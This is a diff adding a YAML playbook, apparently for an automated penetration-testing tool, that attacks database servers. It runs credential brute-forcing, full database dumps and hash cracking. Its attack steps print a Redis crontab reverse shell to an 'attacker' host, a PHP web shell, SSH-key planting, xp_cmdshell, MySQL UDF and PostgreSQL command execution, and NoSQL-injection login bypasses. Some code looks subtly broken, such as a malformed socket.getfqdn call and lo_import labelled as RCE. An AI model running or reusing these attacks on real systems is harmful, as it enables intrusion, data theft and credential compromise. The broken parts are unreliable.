@@ -1,0 +1,442 @@
+name: "Database Assessment"
+description: >
+  Deep database penetration testing across all major database engines.
+  Covers discovery, authentication bypass, privilege escalation, data
+  extraction, command execution, and known CVEs for MSSQL, MySQL/MariaDB,
+  PostgreSQL, Oracle, MongoDB, Redis, Cassandra, Elasticsearch, CouchDB,
+  Memcached, and Neo4j. Provider-agnostic — works on-prem or cloud.
+version: "2.0"
+target_required: true
+
+vars:
+  db_port: 0
+  db_type: ""
+  db_user: ""
+  db_pass: ""
+  wordlist_dir: "/wordlists"
+
+preflight:
+  - id: preamble
+    type: log
+    message: "Database assessment — {target}:{db_port} ({db_type}) case: {case_id}"
+
+steps:
+  # Phase 1: Database discovery & fingerprinting
+  - id: discovery
+    name: "Database service discovery"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: scan_common
+        name: "Scan common DB ports"
+        tool: nmap
+        args:
+          - "-sV"
+          - "-Pn"
+          - "-p"
+          - "1433,1521,3306,3372,5432,5984,6379,7000,9042,9160,9200,11211,27017,50000"
+          - "--open"
+          - "{target}"
+          - "-oN"
+          - "{case_dir}/db-discovery.txt"
+        timeout: 180
+        artifacts:
+          - "{case_dir}/db-discovery.txt"
+
+      - id: banner_grab
+        name: "Banner grab detected DB ports"
+        tool: python3
+        args: ["-c", "import socket,sys; host=sys.argv[1]; ports=[int(p) for p in sys.argv[2].split(',')]; [print(f'{p}: {socket.getfqdn(host,p)}') if socket.getfqdn(host,p) else print(f'{p}: timeout') for p in ports]",
+               "{target}", "{db_port}"]
+        timeout: 60
+        when: "has:db_port"
+
+      - id: db_type_detect
+        name: "Auto-detect DB type from port"
+        tool: python3
+        args: ["-c", "import sys; p=int(sys.argv[1]); m={1433:'mssql',1521:'oracle',3306:'mysql',5432:'postgresql',5984:'couchdb',6379:'redis',7000:'cassandra',9042:'cassandra',9160:'cassandra',9200:'elasticsearch',11211:'memcached',27017:'mongodb',50000:'db2'}; print(m.get(p,f'unknown:{p}'))",
+               "{db_port}"]
+        timeout: 15
+        save: "{case_dir}/db-type.txt"
+
+  # Phase 2: Authentication testing
+  - id: auth_test
+    name: "Authentication & credential testing"
+    type: sequential
+    steps:
+      - id: default_creds
+        name: "Test default credentials"
+        type: parallel
+        max_workers: 6
+        steps:
+          - id: cred_mysql
+            name: "MySQL default creds"
+            tool: mysql
+            args: ["-h", "{target}", "-u", "root",
+                   "--password=", "-e", "SELECT VERSION();"]
+            timeout: 15
+            when: "on_port:3306"
+
+          - id: cred_mysql_root
+            name: "MySQL root:root"
+            tool: mysql
+            args: ["-h", "{target}", "-u", "root",
+                   "--password=root", "-e", "SELECT VERSION();"]
+            timeout: 15
+            when: "on_port:3306"
+
+          - id: cred_postgres
+            name: "PostgreSQL postgres:postgres"
+            tool: psql
+            args: ["-h", "{target}", "-U", "postgres",
+                   "-c", "SELECT VERSION();"]
+            timeout: 15
+            when: "on_port:5432"
+
+          - id: cred_mssql_sa
+            name: "MSSQL sa:empty"
+            tool: sqsh
+            args: ["-S", "{target}", "-U", "sa", "-P", "",
+                   "-C", "SELECT @@VERSION"]
+            timeout: 15
+            when: "on_port:1433"
+
+          - id: cred_mongo
+            name: "MongoDB no-auth"
+            tool: mongo
+            args: ["--host", "{target}", "--eval", "db.version()"]
+            timeout: 15
+            when: "on_port:27017"
+
+          - id: cred_redis
+            name: "Redis no-auth"
+            tool: redis-cli
+            args: ["-h", "{target}", "INFO", "server"]
+            timeout: 15
+            when: "on_port:6379"
+
+      - id: brute_force
+        name: "Credential brute-force"
+        tool: hydra
+        args: ["-L", "{wordlist_dir}/db-usernames.txt",
+               "-P", "{wordlist_dir}/common-passwords.txt",
+               "{target}", "{db_type}",
+               "-s", "{db_port}",
+               "-o", "{case_dir}/db-brute.txt",
+               "-f"]
+        timeout: 300
+        when: "has:db_port"
+        artifacts:
+          - "{case_dir}/db-brute.txt"
+
+  # Phase 3: Per-engine deep testing
+  - id: engine_tests
+    name: "Engine-specific deep testing"
+    type: parallel
+    max_workers: 3
+    steps:
+      # MSSQL
+      - id: mssql_tests
+        name: "MSSQL deep checks"
+        type: sequential
+        when: "on_port:1433"
+        steps:
+          - id: mssql_links
+            name: "Enumerate linked servers"
+            tool: sqsh
+            args: ["-S", "{target}", "-U", "{db_user}", "-P", "{db_pass}",
+                   "-C", "EXEC sp_linkedservers; SELECT * FROM OPENROWSET('SQLNCLI','DRIVER={SQL Server};SERVER=localhost;Trusted_Connection=yes','SELECT @@VERSION')"]
+            timeout: 30
+            save: "{case_dir}/mssql-links.txt"
+
+          - id: mssql_xpcmdshell
+            name: "Test xp_cmdshell"
+            tool: python3
+            args: ["-c", "import sys; print(f'Enable: EXEC sp_configure \\\"xp_cmdshell\\\",1; RECONFIGURE\\nExecute: EXEC xp_cmdshell \\\"whoami\\\"\\nCheck: SELECT * FROM sys.configurations WHERE name=\\\"xp_cmdshell\\\"')"]
+            save: "{case_dir}/mssql-xpcmdshell.txt"
+            timeout: 15
+
+          - id: mssql_impersonate
+            name: "Check impersonation privileges"
+            tool: sqsh
+            args: ["-S", "{target}", "-U", "{db_user}", "-P", "{db_pass}",
+                   "-C", "SELECT * FROM sys.login_token WHERE principal_id <> 0 AND type = 'W'; SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"]
+            timeout: 30
+            save: "{case_dir}/mssql-impersonate.txt"
+
+      # MySQL/MariaDB
+      - id: mysql_tests
+        name: "MySQL/MariaDB deep checks"
+        type: sequential
+        when: "on_port:3306"
+        steps:
+          - id: mysql_privs
+            name: "Enumerate user privileges"
+            tool: mysql
+            args: ["-h", "{target}", "-u", "{db_user}",
+                   "--password={db_pass}", "-e",
+                   "SELECT user,host,file_priv,super_priv,create_routine_priv FROM mysql.user; SHOW GRANTS; SELECT @@secure_file_priv, @@plugin_dir, @@basedir;"]
+            timeout: 30
+            save: "{case_dir}/mysql-privs.txt"
+
+          - id: mysql_udf
+            name: "Test UDF exploit vector"
+            tool: python3
+            args: ["-c", "import sys; print('UDF exploit: CREATE FUNCTION sys_exec RETURNS INTEGER SONAME \\\"udf.so\\\";\\nSELECT sys_exec(\\\"whoami\\\");\\nRequires: secure_file_priv != NULL, plugin dir writable, FILE privilege')"]
+            save: "{case_dir}/mysql-udf.txt"
+            timeout: 15
+
+          - id: mysql_cve
+            name: "MySQL CVE checks"
+            tool: nmap
+            args:
+              - "--script"
+              - "mysql-vuln-cve2012-2122,mysql-empty-password,mysql-audit"
+              - "-p"
+              - "3306"
+              - "{target}"
+              - "-oN"
+              - "{case_dir}/mysql-cve.txt"
+            timeout: 60
+            artifacts:
+              - "{case_dir}/mysql-cve.txt"
+
+      # PostgreSQL
+      - id: pgsql_tests
+        name: "PostgreSQL deep checks"
+        type: sequential
+        when: "on_port:5432"
+        steps:
+          - id: pgsql_enum
+            name: "Enumerate roles and config"
+            tool: psql
+            args: ["-h", "{target}", "-U", "{db_user}",
+                   "-c", "SELECT usename,passwd FROM pg_shadow; SELECT current_setting('password_encryption'); SELECT * FROM pg_hba_file_rules; SELECT current_database(); SELECT current_schema(); SELECT current_user; SELECT * FROM pg_roles; SELECT * FROM pg_stat_activity;"]
+            timeout: 30
+            save: "{case_dir}/pgsql-enum.txt"
+
+          - id: pgsql_trust
+            name: "Check trust authentication"
+            tool: nmap
+            args:
+              ["--script", "pgsql-brute", "-p", "5432", "{target}",
+               "-oN", "{case_dir}/pgsql-trust.txt"]
+            timeout: 60
+
+          - id: pgsql_rce
+            name: "PostgreSQL RCE vectors"
+            tool: python3
+            args: ["-c", "import sys; print('RCE via COPY: COPY cmd_exec FROM PROGRAM \\\"whoami\\\";\\nRCE via lo_import: SELECT lo_import(\\\"/etc/passwd\\\");\\nRCE via dblink: SELECT * FROM dblink(\\\"host=attacker dbname=evil\\\",\\\"SELECT 1\\\") AS t(i int);\\nRCE via pg_read_file: SELECT pg_read_file(\\\"/etc/passwd\\\");')"]
+            save: "{case_dir}/pgsql-rce.txt"
+            timeout: 15
+
+      # Oracle
+      - id: oracle_tests
+        name: "Oracle deep checks"
+        type: sequential
+        when: "on_port:1521"
+        steps:
+          - id: oracle_sid
+            name: "Enumerate SIDs"
+            tool: nmap
+            args:
+              ["--script", "oracle-sid-brute", "-p", "1521",
+               "{target}", "-oN", "{case_dir}/oracle-sids.txt"]
+            timeout: 180
+            artifacts:
+              - "{case_dir}/oracle-sids.txt"
+
+          - id: oracle_auth
+            name: "Oracle auth bypass"
+            tool: odat
+            args: ["sid", "-s", "{target}", "-p", "1521"]
+            timeout: 60
+            save: "{case_dir}/oracle-auth.txt"
+
+      # MongoDB
+      - id: mongo_tests
+        name: "MongoDB deep checks"
+        type: sequential
+        when: "on_port:27017"
+        steps:
+          - id: mongo_enum
+            name: "Enumerate MongoDB"
+            tool: mongo
+            args: ["--host", "{target}", "--eval",
+                   "db.adminCommand('listDatabases'); db.adminCommand('serverStatus'); db.adminCommand({getParameter:'*'}); db.adminCommand({usersInfo:1})"]
+            timeout: 30
+            save: "{case_dir}/mongo-enum.txt"
+
+          - id: mongo_nse
+            name: "MongoDB NSE scripts"
+            tool: nmap
+            args:
+              ["--script", "mongodb-databases,mongodb-info", "-p",
+               "27017", "{target}", "-oN", "{case_dir}/mongo-nse.txt"]
+            timeout: 60
+
+          - id: mongo_nosql_inject
+            name: "NoSQL injection test (MongoDB)"
+            tool: python3
+            args: ["-c", "import sys; t=sys.argv[1]; print('NoSQL injection vectors for '+t+':27017:\\n1. $ne injection: curl -X POST http://'+t+':3000/login -H \"Content-Type: application/json\" -d \\'{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}\\'\\n2. URL param: curl \"http://'+t+':3000/login?username[$ne]=admin&password[$ne]=x\"\\n3. $regex: curl -X POST http://'+t+':3000/login -d \"username[$regex]=.*&password[$regex]=.*\"\\n4. $gt bypass: curl \"http://'+t+':3000/user?age[$gt]=0\"\\n5. Boolean blind: test if app behaves differently\\nCheck for: 200 OK, error messages revealing MongoDB version')",
+               "{target}"]
+            save: "{case_dir}/mongo-nosql.txt"
+            timeout: 15
+
+      # Redis
+      - id: redis_tests
+        name: "Redis deep checks"
+        type: sequential
+        when: "on_port:6379"
+        steps:
+          - id: redis_enum
+            name: "Enumerate Redis"
+            tool: redis-cli
+            args: ["-h", "{target}",
+                   "CONFIG GET *; INFO keyspace; KEYS *; CLIENT LIST; SLOWLOG GET 100"]
+            timeout: 30
+            save: "{case_dir}/redis-enum.txt"
+
+          - id: redis_rce
+            name: "Redis RCE vectors"
+            tool: python3
+            args: ["-c", "import sys; print('Redis RCE:\\n1. SSH key write: CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; SET key \\\"ssh-rsa AAA...\\\"; SAVE\\n2. Crontab: CONFIG SET dir /var/spool/cron; SET key \\\"* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1\\\"; SAVE\\n3. Web shell: CONFIG SET dir /var/www/html; SET key \\\"<?php system(\\$_GET[cmd]); ?>\\\"; SAVE\\n4. Lua sandbox: EVAL \\\"os.execute(\\'whoami\\')\\\" 0')"]
+            save: "{case_dir}/redis-rce.txt"
+            timeout: 15
+
+      # Cassandra
+      - id: cassandra_tests
+        name: "Cassandra deep checks"
+        type: sequential
+        when: "on_port:9042"
+        steps:
+          - id: cassandra_auth
+            name: "Cassandra auth bypass"
+            tool: cqlsh
+            args: ["{target}", "-e",
+                   "DESCRIBE keyspaces; SELECT * FROM system_auth.roles; SELECT * FROM system_schema.keyspaces; SELECT release_version FROM system.local;"]
+            timeout: 30
+            save: "{case_dir}/cassandra-enum.txt"
+
+      # Elasticsearch
+      - id: es_tests
+        name: "Elasticsearch deep checks"
+        type: sequential
+        when: "on_port:9200"
+        steps:
+          - id: es_disclosure
+            name: "ES info disclosure"
+            tool: curl
+            args:
+              ["-s", "http://{target}:9200/"]
+            timeout: 15
+            save: "{case_dir}/es-info.txt"
+
+          - id: es_indices
+            name: "List ES indices"
+            tool: curl
+            args:
+              ["-s", "http://{target}:9200/_cat/indices?v"]
+            timeout: 15
+            save: "{case_dir}/es-indices.txt"
+
+          - id: es_nse
+            name: "ES NSE scripts"
+            tool: nmap
+            args:
+              ["--script", "http-vuln-cve2015-1427", "-p",
+               "9200", "{target}", "-oN", "{case_dir}/es-cve.txt"]
+            timeout: 60
+
+  # Phase 4: Data extraction & post-exploitation
+  - id: post_exploit
+    name: "Data extraction & exfiltration"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: dump_mysql
+        name: "Dump MySQL databases"
+        tool: mysqldump
+        args: ["-h", "{target}", "-u", "{db_user}",
+               "--password={db_pass}", "--all-databases",
+               "--quick", "--lock-tables=false"]
+        timeout: 120
+        save: "{case_dir}/mysql-dump.sql"
+        when: "on_port:3306"
+
+      - id: dump_pgsql
+        name: "Dump PostgreSQL databases"
+        tool: pg_dumpall
+        args: ["-h", "{target}", "-U", "{db_user}",
+               "-f", "{case_dir}/pgsql-dump.sql"]
+        timeout: 120
+        when: "on_port:5432"
+        artifacts:
+          - "{case_dir}/pgsql-dump.sql"
+
+      - id: dump_mongo
+        name: "Dump MongoDB databases"
+        tool: mongodump
+        args: ["--host", "{target}", "--out",
+               "{case_dir}/mongo-dump/"]
+        timeout: 120
+        when: "on_port:27017"
+
+      - id: dump_redis
+        name: "Dump Redis keys"
+        tool: redis-cli
+        args: ["-h", "{target}", "--rdb", "{case_dir}/redis-dump.rdb"]
+        timeout: 60
+        when: "on_port:6379"
+
+  # Phase 5: Hash extraction & cracking
+  - id: hash_extract
+    name: "Password hash extraction"
+    type: sequential
+    steps:
+      - id: extract_hashes
+        name: "Extract password hashes"
+        tool: python3
+        args: ["-c", "import sys; db=sys.argv[1]; cmds={'mysql':'SELECT user,host,authentication_string FROM mysql.user','postgresql':'SELECT usename,passwd FROM pg_shadow','mssql':'SELECT name,password_hash FROM sys.sql_logins','oracle':'SELECT username,password FROM dba_users','mongodb':'db.system.users.find().pretty()'}; print(cmds.get(db,f'No hash extraction for {db}'))",
+               "{db_type}"]
+        save: "{case_dir}/hash-extract-cmds.txt"
+        timeout: 15
+
+      - id: crack_hashes
+        name: "Crack extracted hashes"
+        tool: hashcat
+        args: ["-m", "0", "{case_dir}/hashes.txt",
+               "{wordlist_dir}/rockyou.txt",
+               "--force", "-O"]
+        timeout: 600
+        when: "has:hashes.txt"
+
+  # Phase 6: Report
+  - id: report
+    name: "Database assessment report"
+    type: report
+    format: markdown
+    title: "Database Assessment — {target}"
+    output: "{case_dir}/database-assessment-report.md"
+    sections:
+      - heading: "Target"
+        body: "- Host: {target}:{db_port}\n- DB type: {db_type}\n- Case: {case_id}"
+      - heading: "Discovery"
+        body: "- Port scan: {case_dir}/db-discovery.txt\n- Banner: {case_dir}/db-type.txt"
+      - heading: "Authentication"
+        body: "- Default creds: default credential check results\n- Brute force: {case_dir}/db-brute.txt"
+      - heading: "Engine-Specific Findings"
+        body: "- MSSQL: {case_dir}/mssql-links.txt\n- MySQL: {case_dir}/mysql-privs.txt\n- PostgreSQL: {case_dir}/pgsql-enum.txt\n- Oracle: {case_dir}/oracle-sids.txt\n- MongoDB: {case_dir}/mongo-enum.txt\n- MongoDB NoSQL injection: {case_dir}/mongo-nosql.txt\n- Redis: {case_dir}/redis-enum.txt\n- Cassandra: {case_dir}/cassandra-enum.txt\n- Elasticsearch: {case_dir}/es-info.txt"
+      - heading: "Data Extracted"
+        body: "- MySQL dump: {case_dir}/mysql-dump.sql\n- PostgreSQL dump: {case_dir}/pgsql-dump.sql\n- MongoDB dump: {case_dir}/mongo-dump/\n- Redis dump: {case_dir}/redis-dump.rdb"
+      - heading: "Cracked Credentials"
+        body: "- Hashcat results: hash cracking output"
+
+postflight:
+  - id: cleanup
+    type: log
+    message: "Database assessment complete — {case_dir}"
+  - id: done
+    type: notify
+    level: success
+    message: "Database assessment finished for {target}:{db_port}. Report at {case_dir}/database-assessment-report.md"
